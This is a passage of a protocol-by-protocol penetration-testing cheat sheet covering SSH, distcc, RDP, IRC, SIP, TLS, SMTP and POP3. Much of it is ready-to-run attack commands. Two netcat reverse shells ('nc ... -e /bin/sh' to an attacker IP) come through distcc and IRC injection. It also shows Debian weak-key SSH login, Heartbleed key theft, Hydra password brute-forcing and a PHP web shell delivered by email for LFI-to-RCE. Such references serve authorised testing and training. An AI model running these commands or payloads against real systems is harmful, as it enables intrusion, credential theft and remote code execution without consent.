aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploit </h4> <ul> <li>EID 41173 - Local privEsc</li> </ul> <h3 id="protocols--ssh--cve-2008-0166"> <a href="#protocols--ssh--cve-2008-0166" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2008-0166"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CVE-2008-0166 </h3> <h4 id="protocols--ssh--cve-2008-0166--affected"> <a href="#protocols--ssh--cve-2008-0166--affected" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2008-0166--affected"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Affected </h4> <ul> <li>SSH with OpenSSL 0.9.8c-1 &lt; 0.9.8g-9</li> </ul> <h4 id="protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys"> <a href="#protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Readable .ssh/authorized_keys </h4> <ul> <li>Get DSA or RSA <a href="https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys">common keys</a></li> <li>Grep for the authorized key:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-lr</span> &lt;auth-key&gt;
<span class="c"># .pub file detected</span></code></pre></div></div></li> <li>Connect using the found private file:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> &lt;non.pub&gt; &lt;user&gt;@&lt;ip&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--ssh--cve-2008-0166--other-tools"> <a href="#protocols--ssh--cve-2008-0166--other-tools" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2008-0166--other-tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Other tools </h4> <ul> <li>Check <a href="https://github.com/g0tmi1k/debian-ssh">debian-ssh</a> and <a href="https://github.com/g0tmi1k/debian-ssh/tree/master/our_tools">our_tools</a> dir</li> </ul> <h3 id="protocols--ssh--tricky-commands-configuration"> <a href="#protocols--ssh--tricky-commands-configuration" class="anchor-heading" aria-labelledby="protocols--ssh--tricky-commands-configuration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tricky Commands/Configuration </h3> <h4 id="protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking"> <a href="#protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking" class="anchor-heading" aria-labelledby="protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> POSIX Remote Directory Tracking </h4> <ul> <li><a href="https://github.com/akermu/emacs-libvterm#shell-side-configuration">Vterm codes</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Paste as-is in a remote terminal</span>
<span class="c"># command ssh -F /dev/null &lt;host&gt;; cd .</span>

<span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="k">${</span><span class="nv">IP</span><span class="p">+x</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">OLD_IP</span><span class="o">=</span><span class="s2">"</span><span class="nv">$IP</span><span class="s2">"</span>
<span class="nv">IP</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">expr</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SSH_CONNECTION</span><span class="k">}</span><span class="s2">"</span> : <span class="s2">".* </span><span class="se">\(</span><span class="s2">[^ ]*</span><span class="se">\)</span><span class="s2"> 22"</span><span class="si">)</span><span class="s2">"</span>
<span class="c"># Add others like pushd popd if used</span>
<span class="k">for </span>c <span class="k">in </span><span class="nb">cd </span>chdir<span class="p">;</span> <span class="k">do
  </span><span class="nb">eval</span> <span class="nv">$c</span><span class="s1">' () {
    { command '</span><span class="nv">$c</span><span class="s1">' $@; } &amp;&amp; { printf "\e]51;A-:${USER}@'</span><span class="k">${</span><span class="nv">IP</span><span class="k">}</span><span class="s1">':%s\e\\" "${PWD}"; :; }
  }'</span>
<span class="k">done</span>
<span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">OLD_IP</span><span class="p">+x</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">unset </span>IP <span class="o">||</span> <span class="o">{</span> <span class="nv">IP</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">OLD_IP</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="nb">unset </span>OLD_IP<span class="p">;</span> <span class="o">}</span>
<span class="nb">cd</span> <span class="nb">.</span>

<span class="c"># Tmux escape:  \ePtmux;\e\e]%s\007\e\\</span>
<span class="c"># Screen escape: \eP\e]%s\007\e\\</span></code></pre></div></div></li> </ul> <h4 id="protocols--ssh--tricky-commands-configuration--plink-exe"> <a href="#protocols--ssh--tricky-commands-configuration--plink-exe" class="anchor-heading" aria-labelledby="protocols--ssh--tricky-commands-configuration--plink-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PLINK.exe </h4> <ul> <li>Connect to host<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Inline password with -pw &lt;pass&gt;</span>
<span class="c">:: Different port with -P &lt;port&gt;</span>
<span class="kd">plink</span><span class="err">.exe</span> <span class="na">-ssh </span><span class="kd">root</span>@127.0.0.1</code></pre></div></div></li> <li>Proxy through SOCKS4/HTTP (<a href="https://serverfault.com/a/972499">ref</a>):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">plink</span><span class="err">.exe</span> <span class="na">-ssh -proxycmd </span><span class="s2">"ncat --proxy-type http --proxy &lt;proxy-ip&gt;:&lt;proxy-port&gt; </span><span class="vm">%host</span><span class="s2"> </span><span class="vm">%port</span><span class="s2">"</span> <span class="kd">root</span>@127.0.0.1</code></pre></div></div></li> </ul> <h4 id="protocols--ssh--tricky-commands-configuration--putty-exe"> <a href="#protocols--ssh--tricky-commands-configuration--putty-exe" class="anchor-heading" aria-labelledby="protocols--ssh--tricky-commands-configuration--putty-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PUTTY.exe </h4> <ul> <li>SSH proxy-hopping - <a href="https://stackoverflow.com/a/28937185">How to</a></li> </ul> <h4 id="protocols--ssh--tricky-commands-configuration--ssh"> <a href="#protocols--ssh--tricky-commands-configuration--ssh" class="anchor-heading" aria-labelledby="protocols--ssh--tricky-commands-configuration--ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSH </h4> <ul> <li>List keys associated to private one:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-l</span> <span class="nt">-f</span> &lt;r/dsa&gt;</code></pre></div></div></li> <li>Create public file from private:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-y</span> <span class="nt">-f</span> &lt;r/dsa&gt; <span class="o">&gt;</span> &lt;r/dsa&gt;.pub</code></pre></div></div></li> <li>Set the right permissions to use with <code>-i</code><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Or 400</span>
<span class="nb">chmod </span>600 &lt;r/dsa&gt;.pub</code></pre></div></div></li> <li>Export (to stdout) key in PEM format:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-e</span> <span class="nt">-m</span> PEM <span class="nt">-f</span> &lt;r/dsa&gt;</code></pre></div></div></li> <li>Find the options that are/can be set:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-G</span> <span class="nt">-o</span> &lt;options&gt; root@127.0.0.1</code></pre></div></div></li> <li>Ignore <code>ssh_config</code> and allow weaker algorithms:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> &lt;private-rsa/dsa&gt; <span class="nt">-p</span> &lt;port&gt; <span class="nt">-F</span> /dev/null <span class="nt">-o</span> <span class="nv">PreferredAuthentications</span><span class="o">=</span>password <span class="nt">-o</span> <span class="nv">PubkeyAuthentication</span><span class="o">=</span>no <span class="nt">-o</span> <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="nt">-oKexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 <span class="nt">-ociphers</span><span class="o">=</span>+aes128-cbc root@127.0.0.1</code></pre></div></div></li> <li>Proxy through SOCKS5 (<a href="https://superuser.com/a/454211">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using OpenBSD nc</span>
ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">'/usr/bin/nc -X 5 -x &lt;proxy-ip&gt;:&lt;proxy-port&gt; %h %p'</span> &lt;user&gt;@&lt;ip&gt;

<span class="c"># Using ncat</span>
ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">'/usr/bin/ncat --proxy-type socks5 --proxy &lt;proxy-ip&gt;:&lt;proxy-port&gt; %h %p'</span> &lt;user&gt;@&lt;ip&gt;</code></pre></div></div></li> <li>SSH-hopping:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-J</span> &lt;user-hop1&gt;@&lt;ip-hop1&gt; &lt;user&gt;@&lt;ip&gt;</code></pre></div></div></li> <li>SSH Control Sequences (<a href="https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Only works after newlines</span>
<span class="c"># Disable: ssh -o EscapeChar='none'</span>
~~  <span class="c"># Send Escape</span>
~.  <span class="c"># Terminate connection</span>
~^Z <span class="c"># Background ssh (Ctrl-Z)</span>
~C  <span class="c"># Add commands: -D &lt;socks-port&gt;</span></code></pre></div></div></li> </ul> <h2 id="protocols--distcc"> <a href="#protocols--distcc" class="anchor-heading" aria-labelledby="protocols--distcc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Distcc </h2> <h3 id="protocols--distcc--cve-2004-2687"> <a href="#protocols--distcc--cve-2004-2687" class="anchor-heading" aria-labelledby="protocols--distcc--cve-2004-2687"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CVE-2004-2687 </h3> <h4 id="protocols--distcc--cve-2004-2687--identification"> <a href="#protocols--distcc--cve-2004-2687--identification" class="anchor-heading" aria-labelledby="protocols--distcc--cve-2004-2687--identification"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identification </h4> <ul> <li>Using <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">distcc NSE</a> (<a href="https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-p3632</span> <span class="nt">--script</span><span class="o">=</span>distcc-cve2004-2687 &lt;ip&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--distcc--cve-2004-2687--exploitation"> <a href="#protocols--distcc--cve-2004-2687--exploitation" class="anchor-heading" aria-labelledby="protocols--distcc--cve-2004-2687--exploitation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploitation </h4> <ul> <li>Remote Command Execution:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-p3632</span> <span class="nt">--script</span><span class="o">=</span>distcc-cve2004-2687 <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"distcc-cve2004-2687.cmd='nc &lt;local-ip&gt; 8080 -e /bin/sh'"</span> &lt;ip&gt;</code></pre></div></div></li> </ul> <h2 id="protocols--rdp"> <a href="#protocols--rdp" class="anchor-heading" aria-labelledby="protocols--rdp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RDP </h2> <h3 id="protocols--rdp--windows"> <a href="#protocols--rdp--windows" class="anchor-heading" aria-labelledby="protocols--rdp--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <ul> <li>Enable access:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="kd">add</span> <span class="s2">"HKLM\System\CurrentControlSet\Control\Terminal Server"</span> <span class="na">/f /v </span><span class="kd">fDenyTSConnections</span> <span class="na">/t </span><span class="kd">REG_DWORD</span> <span class="na">/d </span><span class="m">0</span>
<span class="c">:: Check the firewall section for</span>
<span class="c">:: allowing the ports</span></code></pre></div></div></li> <li>See the PowerShell way for enabling the RDP at the <code>Trick Configuration</code> section</li> </ul> <h2 id="protocols--irc"> <a href="#protocols--irc" class="anchor-heading" aria-labelledby="protocols--irc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IRC </h2> <h3 id="protocols--irc--linux"> <a href="#protocols--irc--linux" class="anchor-heading" aria-labelledby="protocols--irc--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h3> <ul> <li>You may execute commands via netcat:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"AB; nc -e /bin/sh &lt;attacker-ip&gt; &lt;port&gt;"</span> | nc 127.0.0.1 &lt;IRC-port&gt;</code></pre></div></div></li> </ul> <h2 id="protocols--voip"> <a href="#protocols--voip" class="anchor-heading" aria-labelledby="protocols--voip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VoIP </h2> <h3 id="protocols--voip--sip"> <a href="#protocols--voip--sip" class="anchor-heading" aria-labelledby="protocols--voip--sip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SIP </h3> <h4 id="protocols--voip--sip--tools"> <a href="#protocols--voip--sip--tools" class="anchor-heading" aria-labelledby="protocols--voip--sip--tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tools </h4> <ul> <li><a href="https://github.com/EnableSecurity/sipvicious">sipvicious</a> suite</li> </ul> <h4 id="protocols--voip--sip--sip-scan"> <a href="#protocols--voip--sip--sip-scan" class="anchor-heading" aria-labelledby="protocols--voip--sip--sip-scan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SIP Scan </h4> <ul> <li>With <a href="https://github.com/EnableSecurity/sipvicious/wiki/SVMap-Usage">svmap</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Identify SIP servers</span>
svmap &lt;ip/hostname&gt;
<span class="c"># Use -p to target different ports</span></code></pre></div></div></li> </ul> <h4 id="protocols--voip--sip--pbx-extensions-scan"> <a href="#protocols--voip--sip--pbx-extensions-scan" class="anchor-heading" aria-labelledby="protocols--voip--sip--pbx-extensions-scan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PBX Extensions Scan </h4> <ul> <li>With <a href="https://github.com/EnableSecurity/sipvicious/wiki/SVWar-Usage">svwar</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find working extensions</span>
svwar <span class="nt">-m</span> OPTIONS <span class="nt">-e100-999</span> &lt;ip/host&gt;
<span class="c"># Use -D instead of -e for defaults</span>
<span class="c"># Alternatively use:</span>
<span class="c"># - REGISTER -&gt; May not always work</span>
<span class="c"># - INVITE -&gt; Note: simulates a call</span>
<span class="c"># Use --force to bypass checks</span></code></pre></div></div></li> </ul> <h2 id="protocols--ssl-tls"> <a href="#protocols--ssl-tls" class="anchor-heading" aria-labelledby="protocols--ssl-tls"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSL/TLS </h2> <h3 id="protocols--ssl-tls--scan---test"> <a href="#protocols--ssl-tls--scan---test" class="anchor-heading" aria-labelledby="protocols--ssl-tls--scan---test"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Scan / Test </h3> <ul> <li>Proto/Cipher/Vulns - <a href="https://github.com/drwetter/testssl.sh">testssl.sh</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Checks Heartbleed and others</span>
testssl.sh <span class="nt">--full</span> &lt;url:port&gt;
<span class="c"># -E check cipher per protocol</span>
<span class="c"># --starttls smtp -&gt; SMTPS checks</span></code></pre></div></div></li> <li>Supported protocols Using <a href="https://github.com/rbsec/sslscan/">sslscan</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sslscan &lt;ip&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--ssl-tls--downgrade-openssl-system-wide"> <a href="#protocols--ssl-tls--downgrade-openssl-system-wide" class="anchor-heading" aria-labelledby="protocols--ssl-tls--downgrade-openssl-system-wide"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Downgrade OpenSSL System-wide </h3> <ul> <li>Modify <code>/etc/ssl/openssl.cnf</code>:<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[<span class="n">system_default_sect</span>]
<span class="c"># &gt; Old &lt;
# MinProtocol  = TLSv1.2
# CipherString = DEFAULT@SECLEVEL=2
</span>
<span class="c"># &gt; New &lt;
</span><span class="n">MinProtocol</span>  = <span class="n">None</span>
<span class="n">CipherString</span> = <span class="n">None</span>

<span class="c"># &gt; Or set explicit versions &lt;
# MinProtocol  = TLSv1.0
</span><span class="err">#</span> <span class="n">CipherString</span> = <span class="n">DEFAULT</span>@<span class="n">SECLEVEL</span>=<span class="m">1</span></code></pre></div></div></li> <li>Note that this has nothing to do with certificate validation and this varies <a href="https://stackoverflow.com/a/28048260">per tool</a></li> </ul> <h3 id="protocols--ssl-tls--heartbleed"> <a href="#protocols--ssl-tls--heartbleed" class="anchor-heading" aria-labelledby="protocols--ssl-tls--heartbleed"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Heartbleed </h3> <h4 id="protocols--ssl-tls--heartbleed--affected"> <a href="#protocols--ssl-tls--heartbleed--affected" class="anchor-heading" aria-labelledby="protocols--ssl-tls--heartbleed--affected"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Affected </h4> <ul> <li>OpenSSL 1.0.1 &lt; 1.0.1g</li> <li>Not vulnerable on those compiled with <code>-DOPENSSL_NO_HEARTBEATS</code></li> </ul> <h4 id="protocols--ssl-tls--heartbleed--exploits"> <a href="#protocols--ssl-tls--heartbleed--exploits" class="anchor-heading" aria-labelledby="protocols--ssl-tls--heartbleed--exploits"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploits </h4> <ul> <li><a href="https://github.com/Saiprasad16/Heartbleed/blob/master/attack.py">attack.py</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ask for 16385 memory bytes</span>
./attack.py <span class="nt">-l</span> 0x4001 &lt;ip-host&gt;

<span class="c"># Find private RSA key on port 4343</span>
./attack.py <span class="nt">-p</span> 4343 <span class="nt">-e</span> &lt;ip-host&gt;</code></pre></div></div></li> <li><a href="https://github.com/robertdavidgraham/heartleech">heartleech</a> - Auto-RSA key finder</li> <li><a href="https://github.com/einaros/heartbleed-tools">heartbleed-tools</a> - Multiple Tools</li> <li><a href="https://github.com/indutny/heartbleed">heatbleed.js</a> - Find RSA key + set ciphers</li> <li><a href="https://github.com/Lekensteyn/pacemaker">pacemaker</a></li> <li><a href="https://gist.github.com/omegahanggara/10993814">heartbleed.c</a> - Client/Server Exploiter</li> </ul> <h2 id="protocols--smtp"> <a href="#protocols--smtp" class="anchor-heading" aria-labelledby="protocols--smtp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SMTP </h2> <h3 id="protocols--smtp--user-enumeration"> <a href="#protocols--smtp--user-enumeration" class="anchor-heading" aria-labelledby="protocols--smtp--user-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> User enumeration </h3> <h4 id="protocols--smtp--user-enumeration--hydra"> <a href="#protocols--smtp--user-enumeration--hydra" class="anchor-heading" aria-labelledby="protocols--smtp--user-enumeration--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h4> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -S for SSL or -O for older SSL</span>
hydra <span class="nt">-s</span> &lt;port&gt; smtp-enum://&lt;ip&gt;/VRFY <span class="nt">-L</span> &lt;user-wlist&gt; <span class="nt">-p</span> &lt;domain&gt;
<span class="c"># EXPN &amp; RCPT are VRFY alternatives</span>
<span class="c"># Use localhost as &lt;domain&gt;</span></code></pre></div></div></li> </ul> <h3 id="protocols--smtp--password-bruteforce"> <a href="#protocols--smtp--password-bruteforce" class="anchor-heading" aria-labelledby="protocols--smtp--password-bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Password Bruteforce </h3> <h4 id="protocols--smtp--password-bruteforce--hydra"> <a href="#protocols--smtp--password-bruteforce--hydra" class="anchor-heading" aria-labelledby="protocols--smtp--password-bruteforce--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h4> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check the other auth type with:</span>
<span class="c">#  hydra -U smtp</span>
hydra <span class="nt">-L</span> &lt;user-wlist&gt; <span class="nt">-P</span> &lt;pass-wlist&gt; <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; smtp://&lt;server&gt;/LOGIN
<span class="c"># Use TLS: smtp://&lt;server&gt;/TLS:LOGIN</span>
<span class="c"># or with: smtps://&lt;server&gt;/LOGIN</span>

<span class="c"># Without module and single user</span>
hydra <span class="nt">-l</span> &lt;user&gt; <span class="nt">-P</span> &lt;pass-wlist&gt; <span class="nt">-f</span> <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; &lt;server&gt; smtp
<span class="c"># Use -S for SSL or -O for older SSL</span></code></pre></div></div></li> </ul> <h3 id="protocols--smtp--email-location"> <a href="#protocols--smtp--email-location" class="anchor-heading" aria-labelledby="protocols--smtp--email-location"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Email Location </h3> <h4 id="protocols--smtp--email-location--linux"> <a href="#protocols--smtp--email-location--linux" class="anchor-heading" aria-labelledby="protocols--smtp--email-location--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h4> <ul> <li>Common email locations:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/mail/&lt;user&gt;
/var/spool/mail/&lt;user&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--smtp--send-email---lfi-to-rce"> <a href="#protocols--smtp--send-email---lfi-to-rce" class="anchor-heading" aria-labelledby="protocols--smtp--send-email---lfi-to-rce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Send Email - LFI to RCE </h3> <ul> <li>Using <a href="https://github.com/jetmore/swaks">swaks</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> &lt;user&gt;@localhost <span class="nt">--from</span> <span class="nb">test</span>@test.net <span class="nt">--header</span> <span class="s2">"Subject: test shell"</span> <span class="nt">--body</span> <span class="s1">'SHELL-INIT:&lt;pre&gt; &lt;?php system($_REQUEST["cmd"]); ?&gt; &lt;/pre&gt;:SHELL-END'</span> <span class="nt">--server</span> &lt;ip-port&gt;
<span class="c"># Or --port &lt;port&gt; for non-standard</span></code></pre></div></div></li> <li>Using <code>telnet</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -nC can also work</span>
telnet &lt;ip&gt; &lt;port&gt;
<span class="c"># Keep the &lt;...&gt; below around emails</span>
EHLO world

MAIL FROM:&lt;<span class="nb">test</span>@test.net&gt;

RCPT TO:&lt;<span class="o">[</span>user]@localhost&gt;

DATA

<span class="c"># The body goes from here {</span>
Date: <span class="si">$(</span><span class="nv">LC_ALL</span><span class="o">=</span>C <span class="nb">date</span><span class="si">)</span>
To: <span class="o">[</span>user]@localhost
From: <span class="nb">test</span>@test.net
Subject: <span class="nb">test </span>shell
Message-Id: &lt;20210218153300.1486384@test&gt;

SHELL-INIT:&lt;pre&gt; &lt;?php system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s2">"cmd"</span><span class="o">])</span><span class="p">;</span> ?&gt; &lt;/pre&gt;:SHELL-END


<span class="nb">.</span>
<span class="c"># } To here where it automatically ends</span>

QUIT</code></pre></div></div></li> </ul> <h2 id="protocols--pop3"> <a href="#protocols--pop3" class="anchor-heading" aria-labelledby="protocols--pop3"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> POP3 </h2> <h3 id="protocols--pop3--read-emails"> <a href="#protocols--pop3--read-emails" class="anchor-heading" aria-labelledby="protocols--pop3--read-emails"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Read Emails </h3> <h4 id="protocols--pop3--read-emails--telnet"> <a href="#protocols--pop3--read-emails--telnet" class="anchor-heading" aria-labelledby="protocols--pop3--read-emails--telnet"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Telnet </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;ip/domain&gt; 110

USER &lt;username&gt;

PASS &lt;password&gt;

<span class="c"># Undelete emails marked for deletion</span>
RSET

<span class="c"># List emails</span>
LIST

<span class="c"># Read email</span>
RETR &lt;mail-id&gt;

QUIT</code></pre></div></div> <h3 id="protocols--pop3--password-bruteforce"> <a href="#protocols--pop3--password-bruteforce" class="anchor-heading" aria-labelledby="protocols--pop3--password-bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Password Bruteforce </h3> <h4 id="protocols--pop3--password-bruteforce--hydra"> <a href="#protocols--pop3--password-bruteforce--hydra" class="anchor-heading" aria-labelledby="protocols--pop3--password-bruteforce--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h4> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Usage</a> - Faster to bruteforce than SMTP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check the other auth type with:</span>
<span class="c">#  hydra -U pop3</span>
hydra <span class="nt">-L</span> &lt;user-wlist&gt; <span class="nt">-P</span> &lt;pass-wlist&gt; <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; pop3://&lt;server&gt;/CLEAR

<span class="c"># Without module and single user</span>
hydra <span class="nt">-l</span> &lt;user&gt; <span class="nt">-P</span> &lt;pass-wlist&gt; <span class="nt">-f</span> <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; &lt;server&gt; pop3
<span class="c"># Use -S for SSL or -O for older SSL</span></code></pre></div></div></li> </ul> <h2 id="protocols--xml-rpc"> <a href="#protocols--xml-rpc" class="anchor-heading" aria-labelledby="protocols--xml-rpc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XML-RPC </h2> <h3 id="protocols--xml-rpc--clients"> <a href="#protocols--xml-rpc--clients" class="anchor-heading" aria-labelledby="protocols--xml-rpc--clients"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Clients </h3> <h4 id="protocols--xml-rpc--clients--curl"> <a href="#protocols--xml-rpc--clients--curl" class="anchor-heading" aria-labelledby="protocols--xml-rpc--clients--curl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> curl </h4> <ul> <li>List methods:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0"?&gt; &lt;methodCall&gt; 